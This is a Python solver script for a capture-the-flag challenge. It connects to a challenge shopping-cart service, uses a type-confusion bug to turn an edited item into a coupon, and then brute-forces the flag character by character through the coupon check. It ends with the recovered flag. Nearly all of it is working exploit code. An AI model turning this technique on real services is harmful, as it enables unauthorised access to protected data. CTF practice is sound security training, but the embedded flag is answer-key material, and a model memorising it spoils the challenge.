import socket
import string
import time
import os

CHALL_URL = "csa-2.csa-challenge.com"
CHALL_PORT = 2222

END_CHAR = '}'

MENU_DICT = {
	"add_item" : '1',
	"edit_item" : '2',
	"remove_item" : '3',
	"view_cart" : '4',
	"apply_coupons":'5',
	"checkout" : '6'
}

EDIT_DICT = {
    'type' : '1',
	'kilograms' : '2',
	'ammount_items' : '3',
	'loaves' : '4',
    'liters' : '5',
    'description' : '6',
    'cancel' : '7'
}

class ExploitHandler:
    def __init__(self, chall_url, chall_port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((chall_url, chall_port))
        self.read()
    
    def read(self, sleep_time=0.1):
        res = self.sock.recv(4096).decode()
        print(res)
        time.sleep(sleep_time)
        return res

    def send(self, msg, sleep_time = 0.1):
        print(msg)
        msg = str(msg).encode()
        self.sock.sendall(msg + b'\n')
        time.sleep(sleep_time)

    def terminate(self):
        self.send(MENU_DICT['checkout'])
        res = self.read()
        self.sock.close()
        return res

    def add_item(self, item_type='f'):
        self.send(MENU_DICT['add_item'])
        self.read() # which item would you like to add
        self.send(item_type)
        self.read() # res + welcome

    def edit_item(self, idx : int, item=None, new_val=None, make_coupon = False):
        self.send(MENU_DICT['edit_item'])
        self.read() # which item index would you like to edit
        self.send(idx)
        res = self.read() # which property would you like to edit/ can not edit this item
        can_edit = "Which property would you like to edit?" in res
        assert not (can_edit and make_coupon), "shouldnt be able to edit this item"
        if can_edit:
            self.send(EDIT_DICT[item])
            self.read() # enter new {item_name} value:
            self.send(new_val)
            self.read() # item updated + welcome

    def remove_item(self, idx : int):
        self.send(MENU_DICT['remove_item'])
        self.read() # which item index would you like to remove
        self.send(idx)
        self.read() # Item {idx} removed! + welcome

    def apply_coupons(self, coupon="hello"):
        self.send(MENU_DICT['apply_coupons'])
        self.read() # please enter your coupon
        self.send(coupon)
        res = self.read() # reads the result + welcome menu
        is_valid = "Applied coupon for" in res
        return is_valid

def crack_char(handler, discovered):
    for c in string.printable[:-6]: # the -6 is to remove ' \n\r\x0b\x0c'
        os.system("clear")
        print(f"attempted char: '{c}' || overall: {discovered + c}")
        # time.sleep(1)
        is_valid = handler.apply_coupons(discovered + c)
        if is_valid:
            return c
    assert False, "should have found a valid char"

def exploit_setup(handler):
    handler.apply_coupons()
    handler.remove_item(0)
    handler.remove_item(1)
    handler.add_item()
    handler.add_item()

def main():
    handler = ExploitHandler(CHALL_URL, CHALL_PORT)
    exploit_setup(handler)

    discovered = ""
    last_char = ""

    while last_char != END_CHAR:
        handler.remove_item(2)
        handler.add_item()
        handler.edit_item(2, item = 'loaves', new_val = len(discovered)+1)
        handler.edit_item(2, item = 'kilograms', new_val = 0)
        handler.edit_item(2, item = 'ammount_items', new_val = 0)
        handler.edit_item(2, make_coupon=True)
        last_char = crack_char(handler, discovered)
        discovered += last_char
        print(f"found valid char, new flag overall: {discovered}")
        # time.sleep(0.5)

    print(handler.terminate())
    print(f"the flag is: {discovered}")


if __name__ == "__main__":
    main()

# CSA{Typ3_C0nFu510n_iS_a_ReAL_Pr0bL3m}